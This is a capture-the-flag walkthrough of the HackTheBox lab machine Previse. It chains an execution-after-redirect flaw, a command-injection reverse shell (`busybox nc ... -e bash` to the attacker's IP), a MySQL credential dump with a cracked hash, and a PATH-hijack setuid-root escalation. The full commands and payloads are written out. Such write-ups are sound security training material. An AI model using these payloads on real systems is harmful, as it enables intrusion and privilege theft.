---
tags:
  - hack
  - linux
---
# HackTheBox: [Previse](https://app.hackthebox.com/machines/Previse)

> [!tip]- Summary with Spoilers
> This Linux machine has a simple PHP website with an EAR vulnerability. It's possible to create a login user via a `POST` without actually being authenticated. There's also an unsanitized input in the `logs.php` file that allows a command injection, which can be used to establish a foothold as `www-data`. From there, the admin user's hash is recoverable via MariaDB, and it's crackable. As the admin user, a script runnable via Sudo can be abused for PE.

## Services

### TCP

```console
$ sudo nmap -v -sCV -p- -T4 t
...
Nmap scan report for t (10.10.11.104)
Host is up (0.094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-title: Previse Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNSE: Script Post-scanning.
Initiating NSE at 16:04
Completed NSE at 16:04, 0.00s elapsed
Initiating NSE at 16:04
Completed NSE at 16:04, 0.00s elapsed
Initiating NSE at 16:04
Completed NSE at 16:04, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 224.52 seconds
Raw packets sent: 68731 (3.024MB) | Rcvd: 68010 (2.739MB)
```

#### 80/tcp Http

```console
$ whatweb http://previse.htb
http://previse.htb [302 Found] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.104], Meta-Author[m4lwhere], RedirectLocation[login.php], Script, Title[Previse Home]
http://previse.htb/login.php [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.104], Meta-Author[m4lwhere], PasswordField[password], Script, Title[Previse Login]
```

```console
$ feroxbuster -k -u http://previse.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -d2
...
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://previse.htb/download.php => login.php
200      GET        6l       39w     3031c http://previse.htb/favicon-32x32.png
200      GET        6l       17w     1258c http://previse.htb/favicon-16x16.png
302      GET       71l      164w     2801c http://previse.htb/index.php => login.php
200      GET       10l       39w    29694c http://previse.htb/favicon.ico
200      GET        3l     4821w    65009c http://previse.htb/js/uikit-icons.min.js
200      GET        3l     2219w   133841c http://previse.htb/js/uikit.min.js
302      GET       71l      164w     2801c http://previse.htb/ => login.php
200      GET        1l     4285w   274772c http://previse.htb/css/uikit.min.css
200      GET       20l       64w      980c http://previse.htb/header.php
200      GET       53l      138w     2224c http://previse.htb/login.php
200      GET       31l       60w     1248c http://previse.htb/nav.php
302      GET        0l        0w        0c http://previse.htb/logout.php => login.php
302      GET       74l      176w     2966c http://previse.htb/status.php => login.php
302      GET      112l      263w     4914c http://previse.htb/files.php => login.php
200      GET        1l        1w      263c http://previse.htb/site.webmanifest
302      GET       93l      238w     3994c http://previse.htb/accounts.php => login.php
302      GET       81l      210w     3441c http://previse.htb/file_logs.php => login.php
200      GET       57l      337w    25229c http://previse.htb/apple-touch-icon.png
200      GET        5l       14w      217c http://previse.htb/footer.php
301      GET        9l       28w      308c http://previse.htb/css => http://previse.htb/css/
301      GET        9l       28w      307c http://previse.htb/js => http://previse.htb/js/
200      GET        0l        0w        0c http://previse.htb/config.php
302      GET        0l        0w        0c http://previse.htb/logs.php => login.php
[####################] - 15m   220574/220574  0s      found:24      errors:9
[####################] - 15m   220546/220546  240/s   http://previse.htb/
[####################] - 2s    220546/220546  122867/s http://previse.htb/js/ => Directory listing
[####################] - 2s    220546/220546  104326/s http://previse.htb/css/ => Directory listing
```

## RCE

The website has an [Execution After Redirect (EAR) vulnerability](https://cwe.mitre.org/data/definitions/698.html). In short: the server returns a 302 status code but then proceeds to render the response anyway. It's easy to miss because your browser will redirect, so you need to use `curl` or BurpSuite to view the response before the redirection happens.

So, I'm able to view the output of `acounts.php` without authenticating using `curl`. From there I can see the POST parameters needed to create an account, just `username`, `password` and `confirm`.

That means I can create an account without authenticating:

```console
curl -X POST -d 'username=haxhax' -d 'password=haxhax' -d 'confirm=haxhax' http://previse.htb/accounts.php
```

After logging in, I see one file, which happens to be a site-backup. I'm able to download it and extract the contents:

```console
kali@kali:~/htb-previse/siteBackup
$ rm -rf *kali@kali:~/htb-previse/siteBackup
$ unzip ../siteBackup.zip
Archive:  ../siteBackup.zip
inflating: accounts.php
inflating: config.php
inflating: download.php
inflating: file_logs.php
inflating: files.php
inflating: footer.php
inflating: header.php
inflating: index.php
inflating: login.php
inflating: logout.php
inflating: logs.php
inflating: nav.php
inflating: status.phpkali@kali:~/htb-previse/siteBackup
$ cat config.php
<?phpfunction connectDB(){
$host = 'localhost';
$user = 'root';
$passwd = 'mySQL_p@ssw0rd!:)';
$db = 'previse';
$mycon = new mysqli($host, $user, $passwd, $db);
return $mycon;
}?>
```

The `logs.php` file has a command injection vulnerability in the `delim` parameter:

```console
POST /logs.php HTTP/1.1
Host: previse.htb
Content-Length: 45
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://previse.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://previse.htb/file_logs.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=k2t8039ucph24qo3q1d6fhdtlq
Connection: close

delim=$( busybox nc 10.10.14.12 443 -e bash )
```

```console
www-data@previse:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Using the previously discovered MySQL password, I'm able to get the hash for the user.

```console
www-data@previse:/tmp$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 38
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql> select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | haxhax   | $1$🧂llol$2PFPI1udHJoPtHxC9N45w0 | 2024-05-14 19:34:50 |
+----+----------+------------------------------------+---------------------+
2 rows in set (0.00 sec)
```

The hash is crackable: `ilovecody112235!`

## PE

There's a script that can be run as `root` via Sudo, and it's vulnerable to a Path Injection. I can replace `gzip` with my own malicious script by placing it first in the `PATH` environmental variable.

```console
$ ssh m4lwhere@t
m4lwhere@t's password:
...

Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5
m4lwhere@previse:~$ cat user.txt
ec5d4a..
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere:
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
m4lwhere@previse:~$ ls -l /opt/scripts/access_backup.sh
-rwxr-xr-x 1 root root 486 Jun  6  2021 /opt/scripts/access_backup.sh
```

Here's `/tmp/gzip`:

```text
#!/bin/bash
cp /bin/bash /tmp/x; chown root:root /tmp/x; chmod 6777 /tmp/x
```

```text
m4lwhere@previse:~$ chmod +x /tmp/gzip
m4lwhere@previse:~$ export PATH="/tmp:$PATH"
m4lwhere@previse:~$ which gzip
/tmp/gzip
m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh
m4lwhere@previse:~$ ls -l /tmp/x
-rwsrwsrwx 1 root root 1113504 May 14 20:41 /tmp/x
m4lwhere@previse:~$ /tmp/x -p
x-4.4# cat /root/root.txt
b65f3d...
```
